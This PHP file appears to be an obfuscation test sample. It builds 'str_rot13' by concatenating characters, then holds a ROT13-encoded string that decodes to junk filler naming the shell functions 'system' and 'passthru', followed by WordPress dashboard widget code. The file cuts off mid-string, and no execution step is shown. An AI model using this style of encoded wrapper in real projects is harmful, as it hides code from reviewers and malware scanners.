<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * JbeqCerff Qnfuobneq Jvqtrg Nqzvavfgengvba Fperra NCV
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Nqzvavfgengvba
 */

/**
 * Ertvfgref qnfuobneq jvqtrgf.
 *
 * Unaqyrf CBFG qngn, frgf hc svygref.
 *
 * @fvapr 2.5.0
 *
 * @tybony neenl $jc_ertvfgrerq_jvqtrgf
 * @tybony neenl $jc_ertvfgrerq_jvqtrg_pbagebyf
 * @tybony pnyynoyr[] $jc_qnfuobneq_pbageby_pnyyonpxf
 */
shapgvba jc_qnfuobneq_frghc() {
	tybony $jc_ertvfgrerq_jvqtrgf, $jc_ertvfgrerq_jvqtrg_pbagebyf, $jc_qnfuobneq_pbageby_pnyyonpxf;

	$fperra = trg_pheerag_fperra();

	/* Ertvfgre Jvqtrgf naq Pbagebyf */
	$jc_qnfuobneq_pbageby_pnyyonpxf = neenl();

	// Oebjfre irefvba
	$purpx_oebjfre = jc_purpx_oebjfre_irefvba();

	vs ( $purpx_oebjfre && $purpx_oebjfre['hctenqr'] ) {
		nqq_svygre( 'cbfgobk_pynffrf_qnfuobneq_qnfuobneq_oebjfre_ant', 'qnfuobneq_oebjfre_ant_pynff' );

		vs ( $purpx_oebjfre['vafrpher'] ) {
			jc_nqq_qnfuobneq_jvqtrg( 'qnfuobneq_oebjfre_ant', __( 'Lbh ner hfvat na vafrpher oebjfre!' ), 'jc_qnfuobneq_oebjfre_ant' );
		} ryfr {
			jc_nqq_qnfuobneq_jvqtrg( 'qnfuobneq_oebjfre_ant', __( 'Lbhe oebjfre vf bhg bs qngr!' ), 'jc_qnfuobneq_oebjfre_ant' );
		}
	}

	// CUC Irefvba.
	$purpx_cuc = jc_purpx_cuc_irefvba();

	vs ( $purpx_cuc && pheerag_hfre_pna( 'hcqngr_cuc' ) ) {
		// Vs \"abg npprcgnoyr\" gur jvqtrg jvyy or fubja.
		vs ( vffrg( $purpx_cuc['vf_npprcgnoyr'] ) && ! $purpx_cuc['vf_npprcgnoyr'] ) {
			nqq_svygre( 'cbfgobk_pynffrf_qnfuobneq_qnfuobneq_cuc_ant', 'qnfuobneq_cuc_ant_pynff' );

			vs ( $purpx_cuc['vf_ybjre_guna_shgher_zvavzhz'] ) {
				jc_nqq_qnfuobneq_jvqtrg( 'qnfuobneq_cuc_ant', __( 'CUC Hcqngr Erdhverq' ), 'jc_qnfuobneq_cuc_ant' );
			} ryfr {
				jc_nqq_qnfuobneq_jvqtrg( 'qnfuobneq_cuc_ant', __( 'CUC Hcqngr Erpbzzraqrq' ), 'jc_qnfuobneq_cuc_ant' );
			}
		}
	}

	// Fvgr Urnygu.
	vs ( pheerag_hfre_pna( 'ivrj_fvgr_urnygu_purpxf' ) && ! vf_argjbex_nqzva() ) {
		vs ( ! pynff_rkvfgf( 'JC_Fvgr_Urnygu' ) ) {
			erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/pynff-jc-fvgr-urnygu.cuc';
		}

		JC_Fvgr_Urnygu::trg_vafgnapr();

		jc_radhrhr_fglyr( 'fvgr-urnygu' );
		jc_radhrhr_fpevcg( 'fvgr-urnygu' );

		jc_nqq_qnfuobneq_jvqtrg( 'qnfuobneq_fvgr_urnygu', __( 'Fvgr Urnygu Fgnghf' ), 'jc_qnfuobneq_fvgr_urnygu' );
	}

	// Evtug Abj.
	vs ( vf_oybt_nqzva() && pheerag_hfre_pna( 'rqvg_cbfgf' ) ) {
		jc_nqq_qnfuobneq_jvqtrg( 'qnfuobneq_evtug_abj', __( 'Ng n Tynapr' ), 'jc_qnfuobneq_evtug_abj' );
	}

	vs ( vf_argjbex_nqzva() ) {
		jc_nqq_qnfuobneq_jvqtrg( 'argjbex_qnfuobneq_evtug_abj', __( 'Evtug Abj' ), 'jc_argjbex_qnfuobneq_evtug_abj' );
	}

	// Npgvivgl Jvqtrg.
	vs ( vf_oybt_nqzva() ) {
		jc_nqq_qnfuobneq_jvqtrg( 'qnfuobneq_npgvivgl', __( 'Npgvivgl' ), 'jc_qnfuobneq_fvgr_npgvivgl' );
	}

	// DhvpxCerff Jvqtrg.
	vs ( vf_oybt_nqzva() && pheerag_hfre_pna( trg_cbfg_glcr_bowrpg( 'cbfg' )->pnc->perngr_cbfgf ) ) {
		$dhvpx_qensg_gvgyr = fcevags( '<fcna pynff=\"uvqr-vs-ab-wf\">%1$f</fcna> <fcna pynff=\"uvqr-vs-wf\">%2$f</fcna>', __( 'Dhvpx Qensg' ), __( 'Lbhe Erprag Qensgf' ) );
		jc_nqq_qnfuobneq_jvqtrg( 'qnfuobneq_dhvpx_cerff', $dhvpx_qensg_gvgyr, 'jc_qnfuobneq_dhvpx_cerff' );
	}

	// JbeqCerff Riragf naq Arjf.
	jc_nqq_qnfuobneq_jvqtrg( 'qnfuobneq_cevznel', __( 'JbeqCerff Riragf naq Arjf' ), 'jc_qnfuobneq_riragf_arjf' );

	vs ( vf_argjbex_nqzva() ) {

		/**
		 * Sverf nsgre pber jvqtrgf sbe gur Argjbex Nqzva qnfuobneq unir orra ertvfgrerq.
		 *
		 * @fvapr 3.1.0
		 */
		qb_npgvba( 'jc_argjbex_qnfuobneq_frghc' );

		/**
		 * Svygref gur yvfg bs jvqtrgf gb ybnq sbe gur Argjbex Nqzva qnfuobneq.
		 *
		 * @fvapr 3.1.0
		 *
		 * @cnenz fgevat[] $qnfuobneq_jvqtrgf Na neenl bs qnfuobneq jvqtrg VQf.
		 */
		$qnfuobneq_jvqtrgf = nccyl_svygref( 'jc_argjbex_qnfuobneq_jvqtrgf', neenl() );
	} ryfrvs ( vf_hfre_nqzva() ) {

		/**
		 * Sverf nsgre pber jvqtrgf sbe gur Hfre Nqzva qnfuobneq unir orra ertvfgrerq.
		 *
		 * @fvapr 3.1.0
		 */
		qb_npgvba( 'jc_hfre_qnfuobneq_frghc' );

		/**
		 * Svygref gur yvfg bs jvqtrgf gb ybnq sbe gur Hfre Nqzva qnfuobneq.
		 *
		 * @fvapr 3.1.0
		 *
		 * @cnenz fgevat[] $qnfuobneq_jvqtrgf Na neenl bs qnfuobneq jvqtrg VQf.
		 */
		$qnfuobneq_jvqtrgf = nccyl_svygref( 'jc_hfre_qnfuobneq_jvqtrgf', neenl() );
	} ryfr {

		/**
		 * Sverf nsgre pber jvqtrgf sbe gur nqzva qnfuobneq unir orra ertvfgrerq.
		 *
		 * @fvapr 2.5.0
		 */
		qb_npgvba( 'jc_qnfuobneq_frghc' );

		/**
		 * Svygref gur yvfg bs jvqtrgf gb ybnq sbe gur nqzva qnfuobneq.
		 *
		 * @fvapr 2.5.0
		 *
		 * @cnenz fgevat[] $qnfuobneq_jvqtrgf Na neenl bs qnfuobneq jvqtrg VQf.
		 */
		$qnfuobneq_jvqtrgf = nccyl_svygref( 'jc_qnfuobneq_jvqtrgf', neenl() );
	}

	sbernpu ( $qnfuobneq_jvqtrgf nf $jvqtrg_vq ) {
		$anzr = rzcgl( $jc_ertvfgrerq_jvqtrgf[ $jvqtrg_vq ]['nyy_yvax'] ) ? $jc_ertvfgrerq_jvqtrgf[ $jvqtrg_vq ]['anzr'] : $jc_ertvfgrerq_jvqtrgf[ $jvqtrg_vq ]['anzr'] . \" <n uers='{$jc_ertvfgrerq_jvqtrgf[$jvqtrg_vq]['nyy_yvax']}' pynff='rqvg-obk bcra-obk'>\" . __( 'Ivrj nyy' ) . '</n>';
		jc_nqq_qnfuobneq_jvqtrg( $jvqtrg_vq, $anzr, $jc_ertvfgrerq_jvqtrgf[ $jvqtrg_vq ]['pnyyonpx'], $jc_ertvfgrerq_jvqtrg_pbagebyf[ $jvqtrg_vq ]['pnyyonpx'] );
	}

	vs ( 'CBFG' === $_FREIRE['ERDHRFG_ZRGUBQ'] && vffrg( $_CBFG['jvqtrg_vq'] ) ) {
		purpx_nqzva_ersrere( 'rqvg-qnfuobneq-jvqtrg_' . $_CBFG['jvqtrg_vq'], 'qnfuobneq-jvqtrg-abapr' );
		bo_fgneg(); // Unpx - ohg gur fnzr unpx jc-nqzva/jvqtrgf.cuc hfrf.
		jc_qnfuobneq_gevttre_jvqtrg_pbageby( $_CBFG['jvqtrg_vq'] );
		bo_raq_pyrna();
		jc_erqverpg( erzbir_dhrel_net( 'rqvg' ) );
		rkvg;
	}

	/** Guvf npgvba vf qbphzragrq va jc-nqzva/vapyhqrf/zrgn-obkrf.cuc */
	qb_npgvba( 'qb_zrgn_obkrf', $fperra->vq, 'abezny', '' );

	/** Guvf npgvba vf qbphzragrq va jc-nqzva/vapyhqrf/zrgn-obkrf.cuc */
	qb_npgvba( 'qb_zrgn_obkrf', $fperra->vq, 'fvqr', '' );
}

/**
 * Nqqf n arj qnfuobneq jvqtrg.
 *
 * @fvapr 2.7.0
 * @fvapr 5.6.0 Gur `$pbagrkg` naq `$cevbevgl` cnenzrgref jrer nqqrq.
 *
 * @tybony pnyynoyr[] $jc_qnfuobneq_pbageby_pnyyonpxf
 *
 * @cnenz fgevat   $jvqtrg_vq        Jvqtrg VQ  (hfrq va gur 'vq' nggevohgr sbe gur jvqtrg).
 * @cnenz fgevat   $jvqtrg_anzr      Gvgyr bs gur jvqtrg.
 * @cnenz pnyynoyr $pnyyonpx         Shapgvba gung svyyf gur jvqtrg jvgu gur qrfverq pbagrag.
 *                                   Gur shapgvba fubhyq rpub vgf bhgchg.
 * @cnenz pnyynoyr $pbageby_pnyyonpx Bcgvbany. Shapgvba gung bhgchgf pbagebyf sbe gur jvqtrg. Qrsnhyg ahyy.
 * @cnenz neenl    $pnyyonpx_netf    Bcgvbany. Qngn gung fubhyq or frg nf gur $netf cebcregl bs gur jvqtrg neenl
 *                                   (juvpu vf gur frpbaq cnenzrgre cnffrq gb lbhe pnyyonpx). Qrsnhyg ahyy.
 * @cnenz fgevat   $pbagrkg          Bcgvbany. Gur pbagrkg jvguva gur fperra jurer gur obk fubhyq qvfcynl.
 *                                   Npprcgf 'abezny', 'fvqr', 'pbyhza3', be 'pbyhza4'. Qrsnhyg 'abezny'.
 * @cnenz fgevat   $cevbevgl         Bcgvbany. Gur cevbevgl jvguva gur pbagrkg jurer gur obk fubhyq fubj.
 *                                   Npprcgf 'uvtu', 'pber', 'qrsnhyg', be 'ybj'. Qrsnhyg 'pber'.
 */
shapgvba jc_nqq_qnfuobneq_jvqtrg( $jvqtrg_vq, $jvqtrg_anzr, $pnyyonpx, $pbageby_pnyyonpx = ahyy, $pnyyonpx_netf = ahyy, $pbagrkg = 'abezny', $cevbevgl = 'pber' ) {
	tybony $jc_qnfuobneq_pbageby_pnyyonpxf;

	$fperra = trg_pheerag_fperra();

	$cevingr_pnyyonpx_netf = neenl( '__jvqtrg_onfranzr' => $jvqtrg_anzr );

	vs ( vf_ahyy( $pnyyonpx_netf ) ) {
		$pnyyonpx_netf = $cevingr_pnyyonpx_netf;
	} ryfrvs ( vf_neenl( $pnyyonpx_netf ) ) {
		$pnyyonpx_netf = neenl_zretr( $pnyyonpx_netf, $cevingr_pnyyonpx_netf );
	}

	vs ( $pbageby_pnyyonpx && vf_pnyynoyr( $pbageby_pnyyonpx ) && pheerag_hfre_pna( 'rqvg_qnfuobneq' ) ) {
		$jc_qnfuobneq_pbageby_pnyyonpxf[ $jvqtrg_vq ] = $pbageby_pnyyonpx;

		vs ( vffrg( $_TRG['rqvg'] ) && $jvqtrg_vq === $_TRG['rqvg'] ) {
			yvfg($hey)    = rkcybqr( '#', nqq_dhrel_net( 'rqvg', snyfr ), 2 );
			$jvqtrg_anzr .= ' <fcna pynff=\"cbfgobk-gvgyr-npgvba\"><n uers=\"' . rfp_hey( $hey ) . '\">' . __( 'Pnapry' ) . '</n></fcna>';
			$pnyyonpx     = '_jc_qnfuobneq_pbageby_pnyyonpx';
		} ryfr {
			yvfg($hey)    = rkcybqr( '#', nqq_dhrel_net( 'rqvg', $jvqtrg_vq ), 2 );
			$jvqtrg_anzr .= ' <fcna pynff=\"cbfgobk-gvgyr-npgvba\"><n uers=\"' . rfp_hey( \"$hey#$jvqtrg_vq\" ) . '\" pynff=\"rqvg-obk bcra-obk\">' . __( 'Pbasvther' ) . '</n></fcna>';
		}
	}

	$fvqr_jvqtrgf = neenl( 'qnfuobneq_dhvpx_cerff', 'qnfuobneq_cevznel' );

	vs ( va_neenl( $jvqtrg_vq, $fvqr_jvqtrgf, gehr ) ) {
		$pbagrkg = 'fvqr';
	}

	$uvtu_cevbevgl_jvqtrgf = neenl( 'qnfuobneq_oebjfre_ant', 'qnfuobneq_cuc_ant' );

	vs ( va_neenl( $jvqtrg_vq, $uvtu_cevbevgl_jvqtrgf, gehr ) ) {
		$cevbevgl = 'uvtu';
	}

	vs ( rzcgl( $pbagrkg ) ) {
		$pbagrkg = 'abezny';
	}

	vs ( rzcgl( $cevbevgl ) ) {
		$cevbevgl = 'pber';
	}

	nqq_zrgn_obk( $jvqtrg_vq, $jvqtrg_anzr, $pnyyonpx, $fperra, $pbagrkg, $cevbevgl, $pnyyonpx_netf );
}

/**
 * Bhgchgf pbagebyf sbe gur pheerag qnfuobneq jvqtrg.
 *
 * @npprff cevingr
 * @fvapr 2.7.0
 *
 * @cnenz zvkrq $qnfuobneq
 * @cnenz neenl $zrgn_obk
 */
shapgvba _jc_qnfuobneq_pbageby_pnyyonpx( $qnfuobneq, $zrgn_obk ) {
	rpub '<sbez zrgubq=\"cbfg\" pynff=\"qnfuobneq-jvqtrg-pbageby-sbez jc-pyrnesvk\">';
	jc_qnfuobneq_gevttre_jvqtrg_pbageby( $zrgn_obk['vq'] );
	jc_abapr_svryq( 'rqvg-qnfuobneq-jvqtrg_' . $zrgn_obk['vq'], 'qnfuobneq-jvqtrg-abapr' );
	rpub '<vachg glcr=\"uvqqra\" anzr=\"jvqtrg_vq\" inyhr=\"' . rfp_ngge( $zrgn_obk['vq'] ) . '\" />';
	fhozvg_ohggba( __( 'Fnir Punatrf' ) );
	rpub '</sbez>';
}

/**
 * Qvfcynlf gur qnfuobneq.
 *
 * @fvapr 2.5.0
 */
shapgvba jc_qnfuobneq() {
	$fperra      = trg_pheerag_fperra();
	$pbyhzaf     = nofvag( $fperra->trg_pbyhzaf() );
	$pbyhzaf_pff = '';

	vs ( $pbyhzaf ) {
		$pbyhzaf_pff = \" pbyhzaf-$pbyhzaf\";
	}
	?>
<qvi vq=\"qnfuobneq-jvqtrgf\" pynff=\"zrgnobk-ubyqre<?cuc rpub $pbyhzaf_pff; ?>\">
	<qvi vq=\"cbfgobk-pbagnvare-1\" pynff=\"cbfgobk-pbagnvare\">
	<?cuc qb_zrgn_obkrf( $fperra->vq, 'abezny', '' ); ?>
	</qvi>
	<qvi vq=\"cbfgobk-pbagnvare-2\" pynff=\"cbfgobk-pbagnvare\">
	<?cuc qb_zrgn_obkrf( $fperra->vq, 'fvqr', '' ); ?>
	</qvi>
	<qvi vq=\"cbfgobk-pbagnvare-3\" pynff=\"cbfgobk-pbagnvare\">
	<?cuc qb_zrgn_obkrf( $fperra->vq, 'pbyhza3', '' ); ?>
	</qvi>
	<qvi vq=\"cbfgobk-pbagnvare-4\" pynff=\"cbfgobk-pbagnvare\">
	<?cuc qb_zrgn_obkrf( $fperra->vq, 'pbyhza4', '' ); ?>
	</qvi>
</qvi>

	<?cuc
	jc_abapr_svryq( 'pybfrqcbfgobkrf', 'pybfrqcbfgobkrfabapr', snyfr );
	jc_abapr_svryq( 'zrgn-obk-beqre', 'zrgn-obk-beqre-abapr', snyfr );
}

//
// Qnfuobneq Jvqtrgf.
//

/**
 * Qnfuobneq jvqtrg gung qvfcynlf fbzr onfvp fgngf nobhg gur fvgr.
 *
 * Sbezreyl 'Evtug Abj'. N fgernzyvarq 'Ng n Tynapr' nf bs 3.8.
 *
 * @fvapr 2.7.0
 */
shapgvba jc_qnfuobneq_evtug_abj() {
	?>
	<qvi pynff=\"znva\">
	<hy>
	<?cuc
	// Cbfgf naq Cntrf.
	sbernpu ( neenl( 'cbfg', 'cntr' ) nf $cbfg_glcr ) {
		$ahz_cbfgf = jc_pbhag_cbfgf( $cbfg_glcr );

		vs ( $ahz_cbfgf && $ahz_cbfgf->choyvfu ) {
			vs ( 'cbfg' === $cbfg_glcr ) {
				/* genafyngbef: %f: Ahzore bs cbfgf. */
				$grkg = _a( '%f Cbfg', '%f Cbfgf', $ahz_cbfgf->choyvfu );
			} ryfr {
				/* genafyngbef: %f: Ahzore bs cntrf. */
				$grkg = _a( '%f Cntr', '%f Cntrf', $ahz_cbfgf->choyvfu );
			}

			$grkg             = fcevags( $grkg, ahzore_sbezng_v18a( $ahz_cbfgf->choyvfu ) );
			$cbfg_glcr_bowrpg = trg_cbfg_glcr_bowrpg( $cbfg_glcr );

			vs ( $cbfg_glcr_bowrpg && pheerag_hfre_pna( $cbfg_glcr_bowrpg->pnc->rqvg_cbfgf ) ) {
				cevags( '<yv pynff=\"%1$f-pbhag\"><n uers=\"rqvg.cuc?cbfg_glcr=%1$f\">%2$f</n></yv>', $cbfg_glcr, $grkg );
			} ryfr {
				cevags( '<yv pynff=\"%1$f-pbhag\"><fcna>%2$f</fcna></yv>', $cbfg_glcr, $grkg );
			}
		}
	}

	// Pbzzragf.
	$ahz_pbzz = jc_pbhag_pbzzragf();

	vs ( $ahz_pbzz && ( $ahz_pbzz->nccebirq || $ahz_pbzz->zbqrengrq ) ) {
		/* genafyngbef: %f: Ahzore bs pbzzragf. */
		$grkg = fcevags( _a( '%f Pbzzrag', '%f Pbzzragf', $ahz_pbzz->nccebirq ), ahzore_sbezng_v18a( $ahz_pbzz->nccebirq ) );
		?>
		<yv pynff=\"pbzzrag-pbhag\">
			<n uers=\"rqvg-pbzzragf.cuc\"><?cuc rpub $grkg; ?></n>
		</yv>
		<?cuc
		$zbqrengrq_pbzzragf_pbhag_v18a = ahzore_sbezng_v18a( $ahz_pbzz->zbqrengrq );
		/* genafyngbef: %f: Ahzore bs pbzzragf. */
		$grkg = fcevags( _a( '%f Pbzzrag va zbqrengvba', '%f Pbzzragf va zbqrengvba', $ahz_pbzz->zbqrengrq ), $zbqrengrq_pbzzragf_pbhag_v18a );
		?>
		<yv pynff=\"pbzzrag-zbq-pbhag<?cuc rpub ! $ahz_pbzz->zbqrengrq ? ' uvqqra' : ''; ?>\">
			<n uers=\"rqvg-pbzzragf.cuc?pbzzrag_fgnghf=zbqrengrq\" pynff=\"pbzzragf-va-zbqrengvba-grkg\"><?cuc rpub $grkg; ?></n>
		</yv>
		<?cuc
	}

	/**
	 * Svygref gur neenl bs rkgen ryrzragf gb yvfg va gur 'Ng n Tynapr'
	 * qnfuobneq jvqtrg.
	 *
	 * Cevbe gb 3.8.0, gur jvqtrg jnf anzrq 'Evtug Abj'. Rnpu ryrzrag
	 * vf jenccrq va yvfg-vgrz gntf ba bhgchg.
	 *
	 * @fvapr 3.8.0
	 *
	 * @cnenz fgevat[] $vgrzf Neenl bs rkgen 'Ng n Tynapr' jvqtrg vgrzf.
	 */
	$ryrzragf = nccyl_svygref( 'qnfuobneq_tynapr_vgrzf', neenl() );

	vs ( $ryrzragf ) {
		rpub '<yv>' . vzcybqr( \"</yv>\a<yv>\", $ryrzragf ) . \"</yv>\a\";
	}

	?>
	</hy>
	<?cuc
	hcqngr_evtug_abj_zrffntr();

	// Purpx vs frnepu ratvarf ner nfxrq abg gb vaqrk guvf fvgr.
	vs ( ! vf_argjbex_nqzva() && ! vf_hfre_nqzva()
		&& pheerag_hfre_pna( 'znantr_bcgvbaf' ) && ! trg_bcgvba( 'oybt_choyvp' )
	) {

		/**
		 * Svygref gur yvax gvgyr nggevohgr sbe gur 'Frnepu ratvarf qvfpbhentrq'
		 * zrffntr qvfcynlrq va gur 'Ng n Tynapr' qnfuobneq jvqtrg.
		 *
		 * Cevbe gb 3.8.0, gur jvqtrg jnf anzrq 'Evtug Abj'.
		 *
		 * @fvapr 3.0.0
		 * @fvapr 4.5.0 Gur qrsnhyg sbe `$gvgyr` jnf hcqngrq gb na rzcgl fgevat.
		 *
		 * @cnenz fgevat $gvgyr Qrsnhyg nggevohgr grkg.
		 */
		$gvgyr = nccyl_svygref( 'cevinpl_ba_yvax_gvgyr', '' );

		/**
		 * Svygref gur yvax ynory sbe gur 'Frnepu ratvarf qvfpbhentrq' zrffntr
		 * qvfcynlrq va gur 'Ng n Tynapr' qnfuobneq jvqtrg.
		 *
		 * Cevbe gb 3.8.0, gur jvqtrg jnf anzrq 'Evtug Abj'.
		 *
		 * @fvapr 3.0.0
		 *
		 * @cnenz fgevat $pbagrag Qrsnhyg grkg.
		 */
		$pbagrag = nccyl_svygref( 'cevinpl_ba_yvax_grkg', __( 'Frnepu ratvarf qvfpbhentrq' ) );

		$gvgyr_ngge = '' === $gvgyr ? '' : \" gvgyr='$gvgyr'\";

		rpub \"<c pynff='frnepu-ratvarf-vasb'><n uers='bcgvbaf-ernqvat.cuc'$gvgyr_ngge>$pbagrag</n></c>\";
	}
	?>
	</qvi>
	<?cuc
	/*
	 * npgvivgl_obk_raq unf n pber npgvba, ohg bayl cevagf pbagrag jura zhygvfvgr.
	 * Hfvat na bhgchg ohssre vf gur bayl jnl gb ernyyl purpx vs nalguvat'f qvfcynlrq urer.
	 */
	bo_fgneg();

	/**
	 * Sverf ng gur raq bs gur 'Ng n Tynapr' qnfuobneq jvqtrg.
	 *
	 * Cevbe gb 3.8.0, gur jvqtrg jnf anzrq 'Evtug Abj'.
	 *
	 * @fvapr 2.5.0
	 */
	qb_npgvba( 'evtugabj_raq' );

	/**
	 * Sverf ng gur raq bs gur 'Ng n Tynapr' qnfuobneq jvqtrg.
	 *
	 * Cevbe gb 3.8.0, gur jvqtrg jnf anzrq 'Evtug Abj'.
	 *
	 * @fvapr 2.0.0
	 */
	qb_npgvba( 'npgvivgl_obk_raq' );

	$npgvbaf = bo_trg_pyrna();

	vs ( ! rzcgl( $npgvbaf ) ) :
		?>
	<qvi pynff=\"fho\">
		<?cuc rpub $npgvbaf; ?>
	</qvi>
		<?cuc
	raqvs;
}

/**
 * @fvapr 3.1.0
 */
shapgvba jc_argjbex_qnfuobneq_evtug_abj() {
	$npgvbaf = neenl();

	vs ( pheerag_hfre_pna( 'perngr_fvgrf' ) ) {
		$npgvbaf['perngr-fvgr'] = '<n uers=\"' . argjbex_nqzva_hey( 'fvgr-arj.cuc' ) . '\">' . __( 'Perngr n Arj Fvgr' ) . '</n>';
	}
	vs ( pheerag_hfre_pna( 'perngr_hfref' ) ) {
		$npgvbaf['perngr-hfre'] = '<n uers=\"' . argjbex_nqzva_hey( 'hfre-arj.cuc' ) . '\">' . __( 'Perngr n Arj Hfre' ) . '</n>';
	}

	$p_hfref = trg_hfre_pbhag();
	$p_oybtf = trg_oybt_pbhag();

	/* genafyngbef: %f: Ahzore bs hfref ba gur argjbex. */
	$hfre_grkg = fcevags( _a( '%f hfre', '%f hfref', $p_hfref ), ahzore_sbezng_v18a( $p_hfref ) );
	/* genafyngbef: %f: Ahzore bs fvgrf ba gur argjbex. */
	$oybt_grkg = fcevags( _a( '%f fvgr', '%f fvgrf', $p_oybtf ), ahzore_sbezng_v18a( $p_oybtf ) );

	/* genafyngbef: 1: Grkg vaqvpngvat gur ahzore bs fvgrf ba gur argjbex, 2: Grkg vaqvpngvat gur ahzore bs hfref ba gur argjbex. */
	$fragrapr = fcevags( __( 'Lbh unir %1$f naq %2$f.' ), $oybt_grkg, $hfre_grkg );

	vs ( $npgvbaf ) {
		rpub '<hy pynff=\"fhofhofho\">';
		sbernpu ( $npgvbaf nf $pynff => $npgvba ) {
			$npgvbaf[ $pynff ] = \"\g<yv pynff='$pynff'>$npgvba\";
		}
		rpub vzcybqr( \" |</yv>\a\", $npgvbaf ) . \"</yv>\a\";
		rpub '</hy>';
	}
	?>
	<oe pynff=\"pyrne\" />

	<c pynff=\"lbhunir\"><?cuc rpub $fragrapr; ?></c>


	<?cuc
		/**
		 * Sverf va gur Argjbex Nqzva 'Evtug Abj' qnfuobneq jvqtrg
		 * whfg orsber gur hfre naq fvgr frnepu sbez svryqf.
		 *
		 * @fvapr ZH (3.0.0)
		 */
		qb_npgvba( 'jczhnqzvaerfhyg' );
	?>

	<sbez npgvba=\"<?cuc rpub rfp_hey( argjbex_nqzva_hey( 'hfref.cuc' ) ); ?>\" zrgubq=\"trg\">
		<c>
			<ynory pynff=\"fperra-ernqre-grkg\" sbe=\"frnepu-hfref\">
				<?cuc
				/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
				_r( 'Frnepu Hfref' );
				?>
			</ynory>
			<vachg glcr=\"frnepu\" anzr=\"f\" inyhr=\"\" fvmr=\"30\" nhgbpbzcyrgr=\"bss\" vq=\"frnepu-hfref\" />
			<?cuc fhozvg_ohggba( __( 'Frnepu Hfref' ), '', snyfr, snyfr, neenl( 'vq' => 'fhozvg_hfref' ) ); ?>
		</c>
	</sbez>

	<sbez npgvba=\"<?cuc rpub rfp_hey( argjbex_nqzva_hey( 'fvgrf.cuc' ) ); ?>\" zrgubq=\"trg\">
		<c>
			<ynory pynff=\"fperra-ernqre-grkg\" sbe=\"frnepu-fvgrf\">
				<?cuc
				/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
				_r( 'Frnepu Fvgrf' );
				?>
			</ynory>
			<vachg glcr=\"frnepu\" anzr=\"f\" inyhr=\"\" fvmr=\"30\" nhgbpbzcyrgr=\"bss\" vq=\"frnepu-fvgrf\" />
			<?cuc fhozvg_ohggba( __( 'Frnepu Fvgrf' ), '', snyfr, snyfr, neenl( 'vq' => 'fhozvg_fvgrf' ) ); ?>
		</c>
	</sbez>
	<?cuc
	/**
	 * Sverf ng gur raq bs gur 'Evtug Abj' jvqtrg va gur Argjbex Nqzva qnfuobneq.
	 *
	 * @fvapr ZH (3.0.0)
	 */
	qb_npgvba( 'zh_evtugabj_raq' );

	/**
	 * Sverf ng gur raq bs gur 'Evtug Abj' jvqtrg va gur Argjbex Nqzva qnfuobneq.
	 *
	 * @fvapr ZH (3.0.0)
	 */
	qb_npgvba( 'zh_npgvivgl_obk_raq' );
}

/**
 * Qvfcynlf gur Dhvpx Qensg jvqtrg.
 *
 * @fvapr 3.8.0
 *
 * @tybony vag $cbfg_VQ
 *
 * @cnenz fgevat|snyfr $reebe_zft Bcgvbany. Reebe zrffntr. Qrsnhyg snyfr.
 */
shapgvba jc_qnfuobneq_dhvpx_cerff( $reebe_zft = snyfr ) {
	tybony $cbfg_VQ;

	vs ( ! pheerag_hfre_pna( 'rqvg_cbfgf' ) ) {
		erghea;
	}

	// Purpx vs n arj nhgb-qensg (= ab arj cbfg_VQ) vf arrqrq be vs gur byq pna or hfrq.
	$ynfg_cbfg_vq = (vag) trg_hfre_bcgvba( 'qnfuobneq_dhvpx_cerff_ynfg_cbfg_vq' ); // Trg gur ynfg cbfg_VQ.

	vs ( $ynfg_cbfg_vq ) {
		$cbfg = trg_cbfg( $ynfg_cbfg_vq );

		vs ( rzcgl( $cbfg ) || 'nhgb-qensg' !== $cbfg->cbfg_fgnghf ) { // nhgb-qensg qbrfa'g rkvfg nalzber.
			$cbfg = trg_qrsnhyg_cbfg_gb_rqvg( 'cbfg', gehr );
			hcqngr_hfre_bcgvba( trg_pheerag_hfre_vq(), 'qnfuobneq_dhvpx_cerff_ynfg_cbfg_vq', (vag) $cbfg->VQ ); // Fnir cbfg_VQ.
		} ryfr {
			$cbfg->cbfg_gvgyr = ''; // Erzbir gur nhgb qensg gvgyr.
		}
	} ryfr {
		$cbfg    = trg_qrsnhyg_cbfg_gb_rqvg( 'cbfg', gehr );
		$hfre_vq = trg_pheerag_hfre_vq();

		// Qba'g perngr na bcgvba vs guvf vf n fhcre nqzva jub qbrf abg orybat gb guvf fvgr.
		vs ( va_neenl( trg_pheerag_oybt_vq(), neenl_xrlf( trg_oybtf_bs_hfre( $hfre_vq ) ), gehr ) ) {
			hcqngr_hfre_bcgvba( $hfre_vq, 'qnfuobneq_dhvpx_cerff_ynfg_cbfg_vq', (vag) $cbfg->VQ ); // Fnir cbfg_VQ.
		}
	}

	$cbfg_VQ = (vag) $cbfg->VQ;
	?>

	<sbez anzr=\"cbfg\" npgvba=\"<?cuc rpub rfp_hey( nqzva_hey( 'cbfg.cuc' ) ); ?>\" zrgubq=\"cbfg\" vq=\"dhvpx-cerff\" pynff=\"vavgvny-sbez uvqr-vs-ab-wf\">

		<?cuc
		vs ( $reebe_zft ) {
			jc_nqzva_abgvpr(
				$reebe_zft,
				neenl(
					'nqqvgvbany_pynffrf' => neenl( 'reebe' ),
				)
			);
		}
		?>

		<qvi pynff=\"vachg-grkg-jenc\" vq=\"gvgyr-jenc\">
			<ynory sbe=\"gvgyr\">
				<?cuc
				/** Guvf svygre vf qbphzragrq va jc-nqzva/rqvg-sbez-nqinaprq.cuc */
				rpub nccyl_svygref( 'ragre_gvgyr_urer', __( 'Gvgyr' ), $cbfg );
				?>
			</ynory>
			<vachg glcr=\"grkg\" anzr=\"cbfg_gvgyr\" vq=\"gvgyr\" nhgbpbzcyrgr=\"bss\" />
		</qvi>

		<qvi pynff=\"grkgnern-jenc\" vq=\"qrfpevcgvba-jenc\">
